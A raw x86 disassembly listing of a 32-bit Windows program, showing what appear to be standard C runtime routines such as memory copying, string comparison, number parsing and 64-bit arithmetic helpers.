  4283f2:	mov    BYTE PTR [edi],al
  4283f4:	mov    al,BYTE PTR [esi+0x1]
  4283f7:	mov    BYTE PTR [edi+0x1],al
  4283fa:	mov    eax,DWORD PTR [ebp+0x8]
  4283fd:	pop    esi
  4283fe:	pop    edi
  4283ff:	leave  
  428400:	ret    
  428401:	lea    ecx,[ecx+0x0]
  428404:	mov    al,BYTE PTR [esi]
  428406:	mov    BYTE PTR [edi],al
  428408:	mov    al,BYTE PTR [esi+0x1]
  42840b:	mov    BYTE PTR [edi+0x1],al
  42840e:	mov    al,BYTE PTR [esi+0x2]
  428411:	mov    BYTE PTR [edi+0x2],al
  428414:	mov    eax,DWORD PTR [ebp+0x8]
  428417:	pop    esi
  428418:	pop    edi
  428419:	leave  
  42841a:	ret    
  42841b:	nop
  42841c:	lea    esi,[ecx+esi*1-0x4]
  428420:	lea    edi,[ecx+edi*1-0x4]
  428424:	test   edi,0x3
  42842a:	jne    0x428450
  42842c:	shr    ecx,0x2
  42842f:	and    edx,0x3
  428432:	cmp    ecx,0x8
  428435:	jb     0x428444
  428437:	std    
  428438:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42843a:	cld    
  42843b:	jmp    DWORD PTR [edx*4+0x428568]
  428442:	mov    edi,edi
  428444:	neg    ecx
  428446:	jmp    DWORD PTR [ecx*4+0x428518]
  42844d:	lea    ecx,[ecx+0x0]
  428450:	mov    eax,edi
  428452:	mov    edx,0x3
  428457:	cmp    ecx,0x4
  42845a:	jb     0x428468
  42845c:	and    eax,0x3
  42845f:	sub    ecx,eax
  428461:	jmp    DWORD PTR [eax*4+0x42846c]
  428468:	jmp    DWORD PTR [ecx*4+0x428568]
  42846f:	nop
  428470:	jl     0x4283f6
  428472:	inc    edx
  428473:	add    BYTE PTR [eax-0x37ffbd7c],ah
  428479:	test   BYTE PTR [edx+0x0],al
  42847c:	mov    al,BYTE PTR [esi+0x3]
  42847f:	and    edx,ecx
  428481:	mov    BYTE PTR [edi+0x3],al
  428484:	sub    esi,0x1
  428487:	shr    ecx,0x2
  42848a:	sub    edi,0x1
  42848d:	cmp    ecx,0x8
  428490:	jb     0x428444
  428492:	std    
  428493:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428495:	cld    
  428496:	jmp    DWORD PTR [edx*4+0x428568]
  42849d:	lea    ecx,[ecx+0x0]
  4284a0:	mov    al,BYTE PTR [esi+0x3]
  4284a3:	and    edx,ecx
  4284a5:	mov    BYTE PTR [edi+0x3],al
  4284a8:	mov    al,BYTE PTR [esi+0x2]
  4284ab:	shr    ecx,0x2
  4284ae:	mov    BYTE PTR [edi+0x2],al
  4284b1:	sub    esi,0x2
  4284b4:	sub    edi,0x2
  4284b7:	cmp    ecx,0x8
  4284ba:	jb     0x428444
  4284bc:	std    
  4284bd:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4284bf:	cld    
  4284c0:	jmp    DWORD PTR [edx*4+0x428568]
  4284c7:	nop
  4284c8:	mov    al,BYTE PTR [esi+0x3]
  4284cb:	and    edx,ecx
  4284cd:	mov    BYTE PTR [edi+0x3],al
  4284d0:	mov    al,BYTE PTR [esi+0x2]
  4284d3:	mov    BYTE PTR [edi+0x2],al
  4284d6:	mov    al,BYTE PTR [esi+0x1]
  4284d9:	shr    ecx,0x2
  4284dc:	mov    BYTE PTR [edi+0x1],al
  4284df:	sub    esi,0x3
  4284e2:	sub    edi,0x3
  4284e5:	cmp    ecx,0x8
  4284e8:	jb     0x428444
  4284ee:	std    
  4284ef:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4284f1:	cld    
  4284f2:	jmp    DWORD PTR [edx*4+0x428568]
  4284f9:	lea    ecx,[ecx+0x0]
  4284fc:	sbb    al,0x85
  4284fe:	inc    edx
  4284ff:	add    BYTE PTR [eax*4-0x7ad3ffbe],ah
  428506:	inc    edx
  428507:	add    BYTE PTR [eax*4-0x7ac3ffbe],dh
  42850e:	inc    edx
  42850f:	add    BYTE PTR [ebp+eax*4+0x42],al
  428513:	add    BYTE PTR [ebp+eax*4+0x42],cl
  428517:	add    BYTE PTR [edi-0x7b],bl
  42851a:	inc    edx
  42851b:	add    BYTE PTR [ebx-0x76e371bc],cl
  428521:	inc    esp
  428522:	(bad)  
  428523:	sbb    al,0x8b
  428525:	inc    esp
  428526:	mov    ds,WORD PTR [eax]
  428528:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42852c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  428530:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  428534:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  428538:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  42853c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  428540:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  428544:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  428548:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  42854c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  428550:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  428554:	lea    eax,[ecx*4+0x0]
  42855b:	add    esi,eax
  42855d:	add    edi,eax
  42855f:	jmp    DWORD PTR [edx*4+0x428568]
  428566:	mov    edi,edi
  428568:	js     0x4284ef
  42856a:	inc    edx
  42856b:	add    BYTE PTR [eax-0x6fffbd7b],al
  428571:	test   DWORD PTR [edx+0x0],eax
  428574:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428575:	test   DWORD PTR [edx+0x0],eax
  428578:	mov    eax,DWORD PTR [ebp+0x8]
  42857b:	pop    esi
  42857c:	pop    edi
  42857d:	leave  
  42857e:	ret    
  42857f:	nop
  428580:	mov    al,BYTE PTR [esi+0x3]
  428583:	mov    BYTE PTR [edi+0x3],al
  428586:	mov    eax,DWORD PTR [ebp+0x8]
  428589:	pop    esi
  42858a:	pop    edi
  42858b:	leave  
  42858c:	ret    
  42858d:	lea    ecx,[ecx+0x0]
  428590:	mov    al,BYTE PTR [esi+0x3]
  428593:	mov    BYTE PTR [edi+0x3],al
  428596:	mov    al,BYTE PTR [esi+0x2]
  428599:	mov    BYTE PTR [edi+0x2],al
  42859c:	mov    eax,DWORD PTR [ebp+0x8]
  42859f:	pop    esi
  4285a0:	pop    edi
  4285a1:	leave  
  4285a2:	ret    
  4285a3:	nop
  4285a4:	mov    al,BYTE PTR [esi+0x3]
  4285a7:	mov    BYTE PTR [edi+0x3],al
  4285aa:	mov    al,BYTE PTR [esi+0x2]
  4285ad:	mov    BYTE PTR [edi+0x2],al
  4285b0:	mov    al,BYTE PTR [esi+0x1]
  4285b3:	mov    BYTE PTR [edi+0x1],al
  4285b6:	mov    eax,DWORD PTR [ebp+0x8]
  4285b9:	pop    esi
  4285ba:	pop    edi
  4285bb:	leave  
  4285bc:	ret    
  4285bd:	push   ebp
  4285be:	mov    ebp,esp
  4285c0:	sub    esp,0xc
  4285c3:	mov    eax,ds:0x45d430
  4285c8:	xor    eax,DWORD PTR [ebp+0x4]
  4285cb:	and    BYTE PTR [ebp-0x6],0x0
  4285cf:	push   0x6
  4285d1:	mov    DWORD PTR [ebp-0x4],eax
  4285d4:	lea    eax,[ebp-0xc]
  4285d7:	push   eax
  4285d8:	push   0x1004
  4285dd:	push   DWORD PTR [ebp+0x8]
  4285e0:	call   DWORD PTR ds:0x4290fc
  4285e6:	test   eax,eax
  4285e8:	jne    0x4285ef
  4285ea:	or     eax,0xffffffff
  4285ed:	jmp    0x4285f9
  4285ef:	lea    eax,[ebp-0xc]
  4285f2:	push   eax
  4285f3:	call   0x4288fe
  4285f8:	pop    ecx
  4285f9:	mov    ecx,DWORD PTR [ebp-0x4]
  4285fc:	xor    ecx,DWORD PTR [ebp+0x4]
  4285ff:	call   0x425a0c
  428604:	leave  
  428605:	ret    
  428606:	push   0x38
  428608:	push   0x429fb8
  42860d:	call   0x425340
  428612:	mov    eax,ds:0x45d430
  428617:	xor    eax,DWORD PTR [ebp+0x4]
  42861a:	mov    DWORD PTR [ebp-0x1c],eax
  42861d:	xor    edi,edi
  42861f:	mov    DWORD PTR [ebp-0x20],edi
  428622:	mov    DWORD PTR [ebp-0x24],edi
  428625:	mov    eax,DWORD PTR [ebp+0x14]
  428628:	mov    ebx,DWORD PTR [eax]
  42862a:	mov    DWORD PTR [ebp-0x28],ebx
  42862d:	mov    DWORD PTR [ebp-0x2c],edi
  428630:	mov    eax,DWORD PTR [ebp+0x8]
  428633:	cmp    eax,DWORD PTR [ebp+0xc]
  428636:	je     0x4287af
  42863c:	lea    ecx,[ebp-0x40]
  42863f:	push   ecx
  428640:	push   eax
  428641:	mov    esi,DWORD PTR ds:0x4290c4
  428647:	call   esi
  428649:	test   eax,eax
  42864b:	je     0x42866d
  42864d:	cmp    DWORD PTR [ebp-0x40],0x1
  428651:	jne    0x42866d
  428653:	lea    eax,[ebp-0x40]
  428656:	push   eax
  428657:	push   DWORD PTR [ebp+0xc]
  42865a:	call   esi
  42865c:	test   eax,eax
  42865e:	je     0x42866d
  428660:	cmp    DWORD PTR [ebp-0x40],0x1
  428664:	jne    0x42866d
  428666:	mov    DWORD PTR [ebp-0x2c],0x1
  42866d:	cmp    DWORD PTR [ebp-0x2c],edi
  428670:	je     0x42868c
  428672:	cmp    ebx,0xffffffff
  428675:	je     0x42867b
  428677:	mov    esi,ebx
  428679:	jmp    0x428687
  42867b:	push   DWORD PTR [ebp+0x10]
  42867e:	call   0x425950
  428683:	pop    ecx
  428684:	mov    esi,eax
  428686:	inc    esi
  428687:	mov    DWORD PTR [ebp-0x44],esi
  42868a:	jmp    0x42868f
  42868c:	mov    esi,DWORD PTR [ebp-0x44]
  42868f:	cmp    DWORD PTR [ebp-0x2c],edi
  428692:	jne    0x4286ae
  428694:	push   edi
  428695:	push   edi
  428696:	push   ebx
  428697:	push   DWORD PTR [ebp+0x10]
  42869a:	push   0x1
  42869c:	push   DWORD PTR [ebp+0x8]
  42869f:	call   DWORD PTR ds:0x4290ec
  4286a5:	mov    esi,eax
  4286a7:	mov    DWORD PTR [ebp-0x44],esi
  4286aa:	cmp    esi,edi
  4286ac:	je     0x428706
  4286ae:	mov    DWORD PTR [ebp-0x4],edi
  4286b1:	lea    eax,[esi+esi*1]
  4286b4:	add    eax,0x3
  4286b7:	and    eax,0xfffffffc
  4286ba:	call   0x425390
  4286bf:	mov    DWORD PTR [ebp-0x18],esp
  4286c2:	mov    ebx,esp
  4286c4:	mov    DWORD PTR [ebp-0x48],ebx
  4286c7:	lea    eax,[esi+esi*1]
  4286ca:	push   eax
  4286cb:	push   edi
  4286cc:	push   ebx
  4286cd:	call   0x427c40
  4286d2:	add    esp,0xc
  4286d5:	or     DWORD PTR [ebp-0x4],0xffffffff
  4286d9:	jmp    0x4286f2
  4286db:	xor    eax,eax
  4286dd:	inc    eax
  4286de:	ret    
  4286df:	mov    esp,DWORD PTR [ebp-0x18]
  4286e2:	call   0x4287d5
  4286e7:	xor    edi,edi
  4286e9:	xor    ebx,ebx
  4286eb:	or     DWORD PTR [ebp-0x4],0xffffffff
  4286ef:	mov    esi,DWORD PTR [ebp-0x44]
  4286f2:	cmp    ebx,edi
  4286f4:	jne    0x428714
  4286f6:	push   esi
  4286f7:	push   0x2
  4286f9:	call   0x426458
  4286fe:	pop    ecx
  4286ff:	pop    ecx
  428700:	mov    ebx,eax
  428702:	cmp    ebx,edi
  428704:	jne    0x42870d
  428706:	xor    eax,eax
  428708:	jmp    0x4287c1
  42870d:	mov    DWORD PTR [ebp-0x24],0x1
  428714:	push   esi
  428715:	push   ebx
  428716:	push   DWORD PTR [ebp-0x28]
  428719:	push   DWORD PTR [ebp+0x10]
  42871c:	push   0x1
  42871e:	push   DWORD PTR [ebp+0x8]
  428721:	call   DWORD PTR ds:0x4290ec
  428727:	test   eax,eax
  428729:	je     0x4287b2
  42872f:	cmp    DWORD PTR [ebp+0x18],edi
  428732:	je     0x428754
  428734:	push   edi
  428735:	push   edi
  428736:	push   DWORD PTR [ebp+0x1c]
  428739:	push   DWORD PTR [ebp+0x18]
  42873c:	push   esi
  42873d:	push   ebx
  42873e:	push   edi
  42873f:	push   DWORD PTR [ebp+0xc]
  428742:	call   DWORD PTR ds:0x42907c
  428748:	test   eax,eax
  42874a:	je     0x4287b2
  42874c:	mov    eax,DWORD PTR [ebp+0x18]
  42874f:	mov    DWORD PTR [ebp-0x20],eax
  428752:	jmp    0x4287b2
  428754:	cmp    DWORD PTR [ebp-0x2c],edi
  428757:	jne    0x42876f
  428759:	push   edi
  42875a:	push   edi
  42875b:	push   edi
  42875c:	push   edi
  42875d:	push   esi
  42875e:	push   ebx
  42875f:	push   edi
  428760:	push   DWORD PTR [ebp+0xc]
  428763:	call   DWORD PTR ds:0x42907c
  428769:	mov    esi,eax
  42876b:	cmp    esi,edi
  42876d:	je     0x4287b2
  42876f:	push   esi
  428770:	push   0x1
  428772:	call   0x426458
  428777:	pop    ecx
  428778:	pop    ecx
  428779:	mov    DWORD PTR [ebp-0x20],eax
  42877c:	cmp    eax,edi
  42877e:	je     0x4287b2
  428780:	push   edi
  428781:	push   edi
  428782:	push   esi
  428783:	push   eax
  428784:	push   esi
  428785:	push   ebx
  428786:	push   edi
  428787:	push   DWORD PTR [ebp+0xc]
  42878a:	call   DWORD PTR ds:0x42907c
  428790:	cmp    eax,edi
  428792:	jne    0x4287a2
  428794:	push   DWORD PTR [ebp-0x20]
  428797:	call   0x425f4a
  42879c:	pop    ecx
  42879d:	mov    DWORD PTR [ebp-0x20],edi
  4287a0:	jmp    0x4287b2
  4287a2:	cmp    DWORD PTR [ebp-0x28],0xffffffff
  4287a6:	je     0x4287b2
  4287a8:	mov    ecx,DWORD PTR [ebp+0x14]
  4287ab:	mov    DWORD PTR [ecx],eax
  4287ad:	jmp    0x4287b2
  4287af:	mov    ebx,DWORD PTR [ebp-0x48]
  4287b2:	cmp    DWORD PTR [ebp-0x24],edi
  4287b5:	je     0x4287be
  4287b7:	push   ebx
  4287b8:	call   0x425f4a
  4287bd:	pop    ecx
  4287be:	mov    eax,DWORD PTR [ebp-0x20]
  4287c1:	lea    esp,[ebp-0x54]
  4287c4:	mov    ecx,DWORD PTR [ebp-0x1c]
  4287c7:	xor    ecx,DWORD PTR [ebp+0x4]
  4287ca:	call   0x425a0c
  4287cf:	call   0x42537b
  4287d4:	ret    
  4287d5:	push   ebp
  4287d6:	mov    ebp,esp
  4287d8:	sub    esp,0x48
  4287db:	push   ebx
  4287dc:	push   esi
  4287dd:	push   edi
  4287de:	push   0x4
  4287e0:	pop    eax
  4287e1:	call   0x425390
  4287e6:	mov    ebx,esp
  4287e8:	push   0x1c
  4287ea:	lea    eax,[ebp-0x24]
  4287ed:	push   eax
  4287ee:	push   ebx
  4287ef:	call   DWORD PTR ds:0x429108
  4287f5:	test   eax,eax
  4287f7:	je     0x42886a
  4287f9:	mov    edi,DWORD PTR [ebp-0x20]
  4287fc:	lea    eax,[ebp-0x48]
  4287ff:	push   eax
  428800:	call   DWORD PTR ds:0x429048
  428806:	mov    eax,DWORD PTR [ebp-0x44]
  428809:	lea    esi,[eax-0x1]
  42880c:	not    esi
  42880e:	and    esi,ebx
  428810:	sub    esi,eax
  428812:	mov    DWORD PTR [ebp-0x4],eax
  428815:	mov    eax,ds:0x45dac4
  42881a:	mov    ecx,eax
  42881c:	dec    ecx
  42881d:	neg    ecx
  42881f:	sbb    ecx,ecx
  428821:	and    ecx,0xffff1000
  428827:	add    ecx,0x11000
  42882d:	add    ecx,edi
  42882f:	cmp    esi,ecx
  428831:	jb     0x42886a
  428833:	cmp    eax,0x1
  428836:	je     0x428882
  428838:	mov    ebx,edi
  42883a:	mov    edi,0x1000
  42883f:	push   0x1c
  428841:	lea    eax,[ebp-0x24]
  428844:	push   eax
  428845:	push   ebx
  428846:	call   DWORD PTR ds:0x429108
  42884c:	test   eax,eax
  42884e:	je     0x42886a
  428850:	add    ebx,DWORD PTR [ebp-0x18]
  428853:	test   DWORD PTR [ebp-0x14],edi
  428856:	je     0x42883f
  428858:	test   BYTE PTR [ebp-0xf],0x1
  42885c:	mov    ebx,DWORD PTR [ebp-0x24]
  42885f:	je     0x428866
  428861:	xor    eax,eax
  428863:	inc    eax
  428864:	jmp    0x42889e
  428866:	cmp    esi,ebx
  428868:	jae    0x42886e
  42886a:	xor    eax,eax
  42886c:	jmp    0x42889e
  42886e:	push   0x4
  428870:	push   edi
  428871:	push   DWORD PTR [ebp-0x4]
  428874:	push   ebx
  428875:	call   DWORD PTR ds:0x4290cc
  42887b:	mov    eax,ds:0x45dac4
  428880:	jmp    0x428884
  428882:	mov    ebx,esi
  428884:	dec    eax
  428885:	neg    eax
  428887:	sbb    eax,eax
  428889:	and    eax,0x103
  42888e:	lea    ecx,[ebp-0x8]
  428891:	push   ecx
  428892:	inc    eax
  428893:	push   eax
  428894:	push   DWORD PTR [ebp-0x4]
  428897:	push   ebx
  428898:	call   DWORD PTR ds:0x429104
  42889e:	lea    esp,[ebp-0x54]
  4288a1:	pop    edi
  4288a2:	pop    esi
  4288a3:	pop    ebx
  4288a4:	leave  
  4288a5:	ret    
  4288a6:	int3   
  4288a7:	int3   
  4288a8:	int3   
  4288a9:	int3   
  4288aa:	int3   
  4288ab:	int3   
  4288ac:	int3   
  4288ad:	int3   
  4288ae:	int3   
  4288af:	int3   
  4288b0:	push   ebp
  4288b1:	mov    ebp,esp
  4288b3:	push   edi
  4288b4:	push   esi
  4288b5:	push   ebx
  4288b6:	mov    esi,DWORD PTR [ebp+0xc]
  4288b9:	mov    edi,DWORD PTR [ebp+0x8]
  4288bc:	mov    al,0xff
  4288be:	mov    edi,edi
  4288c0:	or     al,al
  4288c2:	je     0x4288f6
  4288c4:	mov    al,BYTE PTR [esi]
  4288c6:	add    esi,0x1
  4288c9:	mov    ah,BYTE PTR [edi]
  4288cb:	add    edi,0x1
  4288ce:	cmp    ah,al
  4288d0:	je     0x4288c0
  4288d2:	sub    al,0x41
  4288d4:	cmp    al,0x1a
  4288d6:	sbb    cl,cl
  4288d8:	and    cl,0x20
  4288db:	add    al,cl
  4288dd:	add    al,0x41
  4288df:	xchg   al,ah
  4288e1:	sub    al,0x41
  4288e3:	cmp    al,0x1a
  4288e5:	sbb    cl,cl
  4288e7:	and    cl,0x20
  4288ea:	add    al,cl
  4288ec:	add    al,0x41
  4288ee:	cmp    al,ah
  4288f0:	je     0x4288c0
  4288f2:	sbb    al,al
  4288f4:	sbb    al,0xff
  4288f6:	movsx  eax,al
  4288f9:	pop    ebx
  4288fa:	pop    esi
  4288fb:	pop    edi
  4288fc:	leave  
  4288fd:	ret    
  4288fe:	push   esi
  4288ff:	push   edi
  428900:	call   0x4251f3
  428905:	mov    edi,DWORD PTR [eax+0x64]
  428908:	cmp    edi,DWORD PTR ds:0x45d58c
  42890e:	je     0x428917
  428910:	call   0x42669f
  428915:	mov    edi,eax
  428917:	mov    esi,DWORD PTR [esp+0xc]
  42891b:	cmp    DWORD PTR [edi+0x28],0x1
  42891f:	movzx  eax,BYTE PTR [esi]
  428922:	jle    0x428932
  428924:	push   0x8
  428926:	push   eax
  428927:	push   edi
  428928:	call   0x428986
  42892d:	add    esp,0xc
  428930:	jmp    0x42893c
  428932:	mov    ecx,DWORD PTR [edi+0x48]
  428935:	movzx  eax,BYTE PTR [ecx+eax*2]
  428939:	and    eax,0x8
  42893c:	test   eax,eax
  42893e:	je     0x428943
  428940:	inc    esi
  428941:	jmp    0x42891b
  428943:	movzx  ecx,BYTE PTR [esi]
  428946:	inc    esi
  428947:	cmp    ecx,0x2d
  42894a:	mov    edx,ecx
  42894c:	je     0x428953
  42894e:	cmp    ecx,0x2b
  428951:	jne    0x428957
  428953:	movzx  ecx,BYTE PTR [esi]
  428956:	inc    esi
  428957:	xor    eax,eax
  428959:	cmp    ecx,0x30
  42895c:	jl     0x428968
  42895e:	cmp    ecx,0x39
  428961:	jg     0x428968
  428963:	sub    ecx,0x30
  428966:	jmp    0x42896b
  428968:	or     ecx,0xffffffff
  42896b:	cmp    ecx,0xffffffff
  42896e:	je     0x42897c
  428970:	lea    eax,[eax+eax*4]
  428973:	lea    eax,[ecx+eax*2]
  428976:	movzx  ecx,BYTE PTR [esi]
  428979:	inc    esi
  42897a:	jmp    0x428959
  42897c:	cmp    edx,0x2d
  42897f:	pop    edi
  428980:	pop    esi
  428981:	jne    0x428985
  428983:	neg    eax
  428985:	ret    
  428986:	push   ebp
  428987:	mov    ebp,esp
  428989:	push   ecx
  42898a:	mov    eax,DWORD PTR [ebp+0xc]
  42898d:	lea    ecx,[eax+0x1]
  428990:	cmp    ecx,0x100
  428996:	mov    ecx,DWORD PTR [ebp+0x8]
  428999:	ja     0x4289a4
  42899b:	mov    ecx,DWORD PTR [ecx+0x48]
  42899e:	movzx  eax,WORD PTR [ecx+eax*2]
  4289a2:	jmp    0x4289f8
  4289a4:	push   esi
  4289a5:	mov    edx,eax
  4289a7:	sar    edx,0x8
  4289aa:	push   edi
  4289ab:	mov    edi,DWORD PTR [ecx+0x48]
  4289ae:	movzx  esi,dl
  4289b1:	test   BYTE PTR [edi+esi*2+0x1],0x80
  4289b6:	pop    edi
  4289b7:	pop    esi
  4289b8:	je     0x4289c9
  4289ba:	and    BYTE PTR [ebp-0x2],0x0
  4289be:	push   0x2
  4289c0:	mov    BYTE PTR [ebp-0x3],al
  4289c3:	mov    BYTE PTR [ebp-0x4],dl
  4289c6:	pop    eax
  4289c7:	jmp    0x4289d3
  4289c9:	and    BYTE PTR [ebp-0x3],0x0
  4289cd:	mov    BYTE PTR [ebp-0x4],al
  4289d0:	xor    eax,eax
  4289d2:	inc    eax
  4289d3:	push   0x1
  4289d5:	push   DWORD PTR [ecx+0x14]
  4289d8:	push   DWORD PTR [ecx+0x4]
  4289db:	lea    ecx,[ebp+0xe]
  4289de:	push   ecx
  4289df:	push   eax
  4289e0:	lea    eax,[ebp-0x4]
  4289e3:	push   eax
  4289e4:	push   0x1
  4289e6:	call   0x427a68
  4289eb:	add    esp,0x1c
  4289ee:	test   eax,eax
  4289f0:	jne    0x4289f4
  4289f2:	leave  
  4289f3:	ret    
  4289f4:	movzx  eax,WORD PTR [ebp+0xe]
  4289f8:	and    eax,DWORD PTR [ebp+0x10]
  4289fb:	leave  
  4289fc:	ret    
  4289fd:	int3   
  4289fe:	int3   
  4289ff:	int3   
  428a00:	mov    eax,DWORD PTR [esp+0x8]
  428a04:	mov    ecx,DWORD PTR [esp+0x10]
  428a08:	or     ecx,eax
  428a0a:	mov    ecx,DWORD PTR [esp+0xc]
  428a0e:	jne    0x428a19
  428a10:	mov    eax,DWORD PTR [esp+0x4]
  428a14:	mul    ecx
  428a16:	ret    0x10
  428a19:	push   ebx
  428a1a:	mul    ecx
  428a1c:	mov    ebx,eax
  428a1e:	mov    eax,DWORD PTR [esp+0x8]
  428a22:	mul    DWORD PTR [esp+0x14]
  428a26:	add    ebx,eax
  428a28:	mov    eax,DWORD PTR [esp+0x8]
  428a2c:	mul    ecx
  428a2e:	add    edx,ebx
  428a30:	pop    ebx
  428a31:	ret    0x10
  428a34:	int3   
  428a35:	int3   
  428a36:	int3   
  428a37:	int3   
  428a38:	int3   
  428a39:	int3   
  428a3a:	int3   
  428a3b:	int3   
  428a3c:	int3   
  428a3d:	int3   
  428a3e:	int3   
  428a3f:	int3   
  428a40:	push   ebp
  428a41:	mov    ebp,esp
  428a43:	push   edi
  428a44:	push   esi
  428a45:	push   ebx
  428a46:	mov    ecx,DWORD PTR [ebp+0x10]
  428a49:	or     ecx,ecx
  428a4b:	je     0x428a9a
  428a4d:	mov    esi,DWORD PTR [ebp+0x8]
  428a50:	mov    edi,DWORD PTR [ebp+0xc]
  428a53:	mov    bh,0x41
  428a55:	mov    bl,0x5a
  428a57:	mov    dh,0x20
  428a59:	lea    ecx,[ecx+0x0]
  428a5c:	mov    ah,BYTE PTR [esi]
  428a5e:	or     ah,ah
  428a60:	mov    al,BYTE PTR [edi]
  428a62:	je     0x428a8b
  428a64:	or     al,al
  428a66:	je     0x428a8b
  428a68:	add    esi,0x1
  428a6b:	add    edi,0x1
  428a6e:	cmp    ah,bh
  428a70:	jb     0x428a78
  428a72:	cmp    ah,bl
  428a74:	ja     0x428a78
  428a76:	add    ah,dh
  428a78:	cmp    al,bh
  428a7a:	jb     0x428a82
  428a7c:	cmp    al,bl
  428a7e:	ja     0x428a82
  428a80:	add    al,dh
  428a82:	cmp    ah,al
  428a84:	jne    0x428a91
  428a86:	sub    ecx,0x1
  428a89:	jne    0x428a5c
  428a8b:	xor    ecx,ecx
  428a8d:	cmp    ah,al
  428a8f:	je     0x428a9a
  428a91:	mov    ecx,0xffffffff
  428a96:	jb     0x428a9a
  428a98:	neg    ecx
  428a9a:	mov    eax,ecx
  428a9c:	pop    ebx
  428a9d:	pop    esi
  428a9e:	pop    edi
  428a9f:	leave  
  428aa0:	ret    
  428aa1:	int3   
  428aa2:	int3   
  428aa3:	int3   
  428aa4:	int3   
  428aa5:	int3   
  428aa6:	int3   
  428aa7:	int3   
  428aa8:	int3   
  428aa9:	int3   
  428aaa:	int3   
  428aab:	int3   
  428aac:	int3   
  428aad:	int3   
  428aae:	int3   
  428aaf:	int3   
  428ab0:	push   esi
  428ab1:	mov    eax,DWORD PTR [esp+0x14]
  428ab5:	or     eax,eax
  428ab7:	jne    0x428ae1
  428ab9:	mov    ecx,DWORD PTR [esp+0x10]
  428abd:	mov    eax,DWORD PTR [esp+0xc]
  428ac1:	xor    edx,edx
  428ac3:	div    ecx
  428ac5:	mov    ebx,eax
  428ac7:	mov    eax,DWORD PTR [esp+0x8]
  428acb:	div    ecx
  428acd:	mov    esi,eax
  428acf:	mov    eax,ebx
  428ad1:	mul    DWORD PTR [esp+0x10]
  428ad5:	mov    ecx,eax
  428ad7:	mov    eax,esi
  428ad9:	mul    DWORD PTR [esp+0x10]
  428add:	add    edx,ecx
  428adf:	jmp    0x428b28
  428ae1:	mov    ecx,eax
  428ae3:	mov    ebx,DWORD PTR [esp+0x10]
  428ae7:	mov    edx,DWORD PTR [esp+0xc]
  428aeb:	mov    eax,DWORD PTR [esp+0x8]
  428aef:	shr    ecx,1
  428af1:	rcr    ebx,1
  428af3:	shr    edx,1
  428af5:	rcr    eax,1
  428af7:	or     ecx,ecx
  428af9:	jne    0x428aef
  428afb:	div    ebx
  428afd:	mov    esi,eax
  428aff:	mul    DWORD PTR [esp+0x14]
  428b03:	mov    ecx,eax
  428b05:	mov    eax,DWORD PTR [esp+0x10]
  428b09:	mul    esi
  428b0b:	add    edx,ecx
  428b0d:	jb     0x428b1d
  428b0f:	cmp    edx,DWORD PTR [esp+0xc]
  428b13:	ja     0x428b1d
  428b15:	jb     0x428b26
  428b17:	cmp    eax,DWORD PTR [esp+0x8]
  428b1b:	jbe    0x428b26
  428b1d:	dec    esi
  428b1e:	sub    eax,DWORD PTR [esp+0x10]
  428b22:	sbb    edx,DWORD PTR [esp+0x14]
  428b26:	xor    ebx,ebx
  428b28:	sub    eax,DWORD PTR [esp+0x8]
  428b2c:	sbb    edx,DWORD PTR [esp+0xc]
  428b30:	neg    edx
  428b32:	neg    eax
  428b34:	sbb    edx,0x0
  428b37:	mov    ecx,edx
  428b39:	mov    edx,ebx
  428b3b:	mov    ebx,ecx
  428b3d:	mov    ecx,eax
  428b3f:	mov    eax,esi
  428b41:	pop    esi
  428b42:	ret    0x10
  428b45:	int3   
  428b46:	int3   
  428b47:	int3   
  428b48:	int3   
  428b49:	int3   
  428b4a:	int3   
  428b4b:	int3   
  428b4c:	int3   
  428b4d:	int3   
  428b4e:	int3   
  428b4f:	int3   
  428b50:	lea    eax,[edx-0x1]
  428b53:	pop    ebx
  428b54:	ret    
  428b55:	lea    esp,[esp+0x0]
  428b5c:	lea    esp,[esp+0x0]
  428b60:	xor    eax,eax
  428b62:	mov    al,BYTE PTR [esp+0x8]
  428b66:	push   ebx
  428b67:	mov    ebx,eax
  428b69:	shl    eax,0x8
  428b6c:	mov    edx,DWORD PTR [esp+0x8]
  428b70:	test   edx,0x3
  428b76:	je     0x428b8d
  428b78:	mov    cl,BYTE PTR [edx]
  428b7a:	add    edx,0x1
  428b7d:	cmp    cl,bl
  428b7f:	je     0x428b50
  428b81:	test   cl,cl
  428b83:	je     0x428bd6
  428b85:	test   edx,0x3
  428b8b:	jne    0x428b78
  428b8d:	or     ebx,eax
  428b8f:	push   edi
  428b90:	mov    eax,ebx
  428b92:	shl    ebx,0x10
  428b95:	push   esi
  428b96:	or     ebx,eax
  428b98:	mov    ecx,DWORD PTR [edx]
  428b9a:	mov    edi,0x7efefeff
  428b9f:	mov    eax,ecx
  428ba1:	mov    esi,edi
  428ba3:	xor    ecx,ebx
  428ba5:	add    esi,eax
  428ba7:	add    edi,ecx
  428ba9:	xor    ecx,0xffffffff
  428bac:	xor    eax,0xffffffff
  428baf:	xor    ecx,edi
  428bb1:	xor    eax,esi
  428bb3:	add    edx,0x4
  428bb6:	and    ecx,0x81010100
  428bbc:	jne    0x428bda
  428bbe:	and    eax,0x81010100
  428bc3:	je     0x428b98
  428bc5:	and    eax,0x1010100
  428bca:	jne    0x428bd4
  428bcc:	and    esi,0x80000000
  428bd2:	jne    0x428b98
  428bd4:	pop    esi
  428bd5:	pop    edi
  428bd6:	pop    ebx
  428bd7:	xor    eax,eax
  428bd9:	ret    
  428bda:	mov    eax,DWORD PTR [edx-0x4]
  428bdd:	cmp    al,bl
  428bdf:	je     0x428c17
  428be1:	test   al,al
  428be3:	je     0x428bd4
  428be5:	cmp    ah,bl
  428be7:	je     0x428c10
  428be9:	test   ah,ah
  428beb:	je     0x428bd4
  428bed:	shr    eax,0x10
